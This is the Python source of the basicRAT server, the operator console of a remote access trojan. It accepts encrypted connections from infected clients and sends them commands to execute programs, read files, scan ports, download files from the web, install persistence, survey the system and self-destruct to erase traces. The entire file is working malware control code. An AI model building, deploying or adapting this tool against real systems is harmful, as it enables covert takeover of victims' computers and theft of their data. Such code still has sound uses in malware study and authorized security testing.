#!/usr/bin/env python

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import select
import socket
import sys
import threading

from core.crypto import encrypt, decrypt, diffiehellman


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
COMMANDS = [ 'cat', 'client', 'clients', 'execute', 'goodbye', 'help', 'kill',
             'ls', 'persistence', 'pwd', 'quit', 'rekey', 'scan', 'selfdestruct',
             'survey', 'unzip', 'wget' ]
HELP_TEXT = '''
cat <file>          - Output a file to the screen.
client <id>         - Connect to a client.
clients             - List connected clients.
execute <command>   - Execute a command on the target.
goodbye             - Exit the server and keep all client connections alive.
help                - Show this help menu.
kill                - Kill the client connection.
ls                  - List files in the current directory.
persistence         - Apply persistence mechanism.
pwd                 - Get the present working directory.
quit                - Exit the server and destroy all client connections.
rekey               - Regenerate crypto key.
scan <ip>           - Scan top 25 TCP ports on a single host.
selfdestruct        - Remove all traces of the RAT from the target system.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
wget <url>          - Download a file from the web.'''
PROMPT = '\n[{}] basicRAT> '


class Server(threading.Thread):
    clients      = {}
    client_count = 1

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            dhkey = diffiehellman(conn)
            client_id = self.client_count
            client = ClientConnection(conn, addr, dhkey, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def select_client(self, client_id):
        try:
            return self.clients[int(client_id)]
        except (KeyError, ValueError):
            return None

    def get_clients(self):
        # order is not retained. maybe use SortedDict here
        return [v for _, v in self.clients.iteritems() if v.alive]

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def quit(self):
        for c in self.get_clients():
            c.send('selfdestruct')
        self.s.shutdown(socket.SHUT_RDWR)
        self.s.close()

    def goodbye(self):
        for c in self.get_clients():
            c.send('goodbye')
        self.s.shutdown(socket.SHUT_RDWR)
        self.s.close()


class ClientConnection():
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.dhkey = dhkey
        self.uid   = uid

    alive = True

    def send(self, prompt):
        if not self.alive:
            print 'Error: Client not connected.'
            return

        # check for old output
        readable, _, _ = select.select([self.conn], [], [], 0)
        if readable:
            print self.old_output(0)

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # selfdestruct rat
        if cmd == 'selfdestruct':
            if raw_input('Remove all traces of basicRAT from the target ' \
                         'system (y/N)? ').startswith('y'):
                print 'Running selfdestruct...'
                self.conn.send(encrypt(prompt, self.dhkey))
                self.conn.close()
            return

        # send prompt to client
        try:
            self.conn.send(encrypt(prompt, self.dhkey))
        except socket.error:
            print 'Error: Could not connect to client.'
            return
        self.conn.settimeout(1)

        # kill client connection
        if cmd == 'kill':
            self.conn.close()

        if cmd == 'rekey':
            self.dhkey = diffiehellman(self.conn)

        # results of execute, persistence, scan, survey, unzip, or wget
        if cmd in [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'rekey',
                    'scan', 'survey', 'unzip', 'wget' ]:
            print 'Running {}...'.format(cmd)
            recv_data = decrypt(self.conn.recv(4096), self.dhkey)
            print recv_data

    def old_output(self, timeout=10):
        readable, _, exceptional = select.select([self.conn], [], [self.conn], timeout)
        if self.conn in exceptional:
            print 'Error: Socket error.'
        elif self.conn in readable:
            recv_data = decrypt(self.conn.recv(4096), self.dhkey)
            return recv_data


def completer(text, state):
    options = [i for i in COMMANDS if i.startswith(text)]
    if state < len(options):
        return options[state] + ' '
    else:
        return None


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser = get_parser()
    args   = vars(parser.parse_args())
    port   = args['port']
    client = None

    print BANNER

    # turn tab completion on
    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'basicRAT server listening for connections on port {}.'.format(port)

    while True:
        try:
            promptstr = PROMPT.format(client.uid)
        except AttributeError:
            promptstr = PROMPT.format('?')

        prompt = raw_input(promptstr).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # ensure command is valid before sending
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue

        # stop the server and keey clients alive
        elif cmd == 'goodbye':
            if raw_input('Stop the server and keep clients alive ' \
                         '(y/N)? ').startswith('y'):
                server.goodbye()
                sys.exit(0)

        # stop the server and destroy clients
        elif cmd == 'quit':
            if raw_input('Stop the server and selfdestruct all client ' \
                         'connections (y/N)? ').startswith('y'):
                server.quit()
                sys.exit(0)

        # display help text
        if cmd == 'help':
            print HELP_TEXT

        # select client
        elif cmd == 'client':
            new_client = server.select_client(action)
            if new_client:
                client = new_client
                print 'Client {} selected.'.format(client.uid)
            else:
                print 'Error: Invalid Client ID'

        # list clients
        elif cmd == 'clients':
            print 'ID - Client Address'
            for k in server.get_clients():
                print '{:>2} - {}'.format(k.uid, k.addr[0])

        # continue loop for above commands
        if cmd in ['help', 'client', 'clients']:
            continue

        # require client id
        if not client:
            print 'Error: Invalid client ID.'
            continue

        # send prompt to client connection handler
        try:
            client.send(prompt)
        except (socket.error, ValueError) as e:
            print e
            print 'Client {} is unresponsive.'.format(client.uid)

        # reset client id if client killed
        if cmd in ['kill', 'selfdestruct']:
            server.remove_client(client.uid)
            client = None


if __name__ == '__main__':
    main()
